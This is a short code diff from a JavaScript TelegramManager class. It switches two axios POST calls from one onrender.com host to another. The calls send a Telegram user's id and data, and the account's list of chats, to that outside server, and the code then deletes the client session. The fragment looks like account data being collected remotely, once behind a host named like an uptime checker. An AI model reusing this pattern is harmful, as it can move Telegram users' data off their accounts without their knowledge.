@@ -367,8 +367,8 @@ class TelegramManager {
             date: date,
             tgId: user.id
         };
-        await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-        await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+        await axios.post(`https://arpithared.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+        await axios.post(`https://arpithared.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
         await sleep(3000);
         await deleteClient(this.phoneNumber)
         // await this.deleteMessages();
